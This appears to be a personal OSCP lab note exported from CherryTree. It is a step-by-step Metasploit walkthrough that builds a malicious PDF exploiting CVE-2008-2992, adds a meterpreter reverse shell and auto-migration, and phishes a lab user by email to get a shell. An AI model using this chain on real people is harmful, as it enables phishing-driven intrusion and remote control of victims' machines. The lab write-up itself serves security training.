<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Adobe Reader</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Adobe Reader</h1></strong><br />Exploit a user trying to read PDFs.<br /><br /><strong><h2>## Adobe Reader util.printf() Buffer Overflow</h2></strong><br />CVE-2008-2992<br /><br /><a href="https://www.rapid7.com/db/modules/exploit/windows/browser/adobe_utilprintf/">https://www.rapid7.com/db/modules/exploit/windows/browser/adobe_utilprintf/</a><br /><a href="https://nvd.nist.gov/vuln/detail/CVE-2008-2992">https://nvd.nist.gov/vuln/detail/CVE-2008-2992</a><br /><a href="https://www.offensive-security.com/metasploit-unleashed/client-side-exploits/">https://www.offensive-security.com/metasploit-unleashed/client-side-exploits/</a><br /><br /><strong>Examples</strong><br />• oscp 10.11.1.7 - Pedro<br /><br /><strong><h3>### Example from OSCP Pedro</h3></strong><br />1. Create PDF<br /><div class="codebox"><div class="codebox">msf5&nbsp;&gt;&nbsp;use&nbsp;exploit/windows/fileformat/adobe_utilprintf<br />msf5&nbsp;exploit(windows/fileformat/adobe_utilprintf)&nbsp;&gt;&nbsp;set&nbsp;FILENAME&nbsp;hello1.pdf<br />FILENAME&nbsp;=&gt;&nbsp;hello1.pdf<br />msf5&nbsp;exploit(windows/fileformat/adobe_utilprintf)&nbsp;&gt;&nbsp;set&nbsp;PAYLOAD&nbsp;windows/meterpreter/reverse_tcp<br />PAYLOAD&nbsp;=&gt;&nbsp;windows/meterpreter/reverse_tcp<br />msf5&nbsp;exploit(windows/fileformat/adobe_utilprintf)&nbsp;&gt;&nbsp;set&nbsp;LHOST&nbsp;10.11.0.184<br />LHOST&nbsp;=&gt;&nbsp;10.11.0.184<br />msf5&nbsp;exploit(windows/fileformat/adobe_utilprintf)&nbsp;&gt;&nbsp;set&nbsp;LPORT&nbsp;9001<br />LPORT&nbsp;=&gt;&nbsp;9001<br />msf5&nbsp;exploit(windows/fileformat/adobe_utilprintf)&nbsp;&gt;&nbsp;run</div></div><br /><br />We&#39;re exploiting Adobe Reader.<br />After it gets exploited, the program will most likely crash and kill our shell.<br />To solve this, we can tell metasploit to auto migrate to a different process, which should keep our shell alive.<br /><br />2. Create a auto-migrate rc file for metasploit.<br /><div class="codebox"><div class="codebox">┌─[root@parrot]─[/oscp/10.11.1.7]<br />└──╼&nbsp;#nano&nbsp;automigrate.rc<br />[...]<br />┌─[root@parrot]─[/oscp/10.11.1.7]<br />└──╼&nbsp;#cat&nbsp;automigrate.rc&nbsp;<br />run&nbsp;post/windows/manage/migrate</div></div><br /><br />3. Set up the exploit handler to receive the shell<br /><div class="codebox"><div class="codebox">msf5&nbsp;exploit(windows/fileformat/adobe_utilprintf)&nbsp;&gt;&nbsp;use&nbsp;exploit/multi/handler<br />msf5&nbsp;exploit(multi/handler)&nbsp;&gt;&nbsp;set&nbsp;PAYLOAD&nbsp;windows/meterpreter/reverse_tcp<br />PAYLOAD&nbsp;=&gt;&nbsp;windows/meterpreter/reverse_tcp<br />msf5&nbsp;exploit(multi/handler)&nbsp;&gt;&nbsp;set&nbsp;LHOST&nbsp;10.11.0.184<br />LHOST&nbsp;=&gt;&nbsp;10.11.0.184<br />msf5&nbsp;exploit(multi/handler)&nbsp;&gt;&nbsp;set&nbsp;LPORT&nbsp;9001<br />LPORT&nbsp;=&gt;&nbsp;9001<br />msf5&nbsp;exploit(multi/handler)&nbsp;&gt;&nbsp;run<br />msf5&nbsp;exploit(multi/handler)&nbsp;&gt;&nbsp;set&nbsp;AutoRunScript&nbsp;multi_console_command&nbsp;-r&nbsp;/oscp/10.11.1.7/automigrate.rc<br />AutoRunScript&nbsp;=&gt;&nbsp;multi_console_command&nbsp;-r&nbsp;/oscp/10.11.1.7/automigrate.rc<br />msf5&nbsp;exploit(multi/handler)&nbsp;&gt;&nbsp;run<br /><br />[*]&nbsp;Started&nbsp;reverse&nbsp;TCP&nbsp;handler&nbsp;on&nbsp;10.11.0.184:9001&nbsp;</div></div><br /><br />4. Send an email to Pedro using <code>sendEmail</code><br /><div class="codebox"><div class="codebox">┌─[root@parrot]─[/oscp/10.11.1.7/pdf]<br />└──╼&nbsp;#sendEmail&nbsp;-t&nbsp;pedro@thinc.local&nbsp;-f&nbsp;jeff@thinc.local&nbsp;-xu&nbsp;jeff@thinc.local&nbsp;-xp&nbsp;woof&nbsp;-u&nbsp;&quot;report&quot;&nbsp;-a&nbsp;report.pdf&nbsp;-m&nbsp;&quot;Hey&nbsp;Pedro,&nbsp;here&#39;s&nbsp;your&nbsp;report&quot;&nbsp;-s&nbsp;10.11.1.229<br />Feb&nbsp;12&nbsp;11:17:22&nbsp;parrot&nbsp;sendEmail[3673]:&nbsp;Email&nbsp;was&nbsp;sent&nbsp;successfully!</div></div><br /><br />5. Wait a bit, you should receive a shell<br /><div class="codebox"><div class="codebox">[*]&nbsp;Sending&nbsp;stage&nbsp;(180291&nbsp;bytes)&nbsp;to&nbsp;10.11.1.7<br />[*]&nbsp;Meterpreter&nbsp;session&nbsp;3&nbsp;opened&nbsp;(10.11.0.184:9001&nbsp;-&gt;&nbsp;10.11.1.7:1041)&nbsp;at&nbsp;2020-02-12&nbsp;11:19:20&nbsp;+0000<br />[*]&nbsp;Session&nbsp;ID&nbsp;3&nbsp;(10.11.0.184:9001&nbsp;-&gt;&nbsp;10.11.1.7:1041)&nbsp;processing&nbsp;AutoRunScript&nbsp;&#39;multi_console_command&nbsp;-r&nbsp;/oscp/10.11.1.7/automigrate.rc&#39;<br />[*]&nbsp;Running&nbsp;Command&nbsp;List&nbsp;...<br />[*]&nbsp;	Running&nbsp;command&nbsp;run&nbsp;post/windows/manage/migrate<br />[*]&nbsp;Running&nbsp;module&nbsp;against&nbsp;PEDRO<br />[*]&nbsp;Current&nbsp;server&nbsp;process:&nbsp;AcroRd32.exe&nbsp;(468)<br />[*]&nbsp;Spawning&nbsp;notepad.exe&nbsp;process&nbsp;to&nbsp;migrate&nbsp;to<br />[+]&nbsp;Migrating&nbsp;to&nbsp;1568<br />[+]&nbsp;Successfully&nbsp;migrated&nbsp;to&nbsp;process&nbsp;1568<br /><br />meterpreter&nbsp;&gt;&nbsp;getuid<br />Server&nbsp;username:&nbsp;PEDRO\pedro</div></div><br /></div>
</body>
</html>
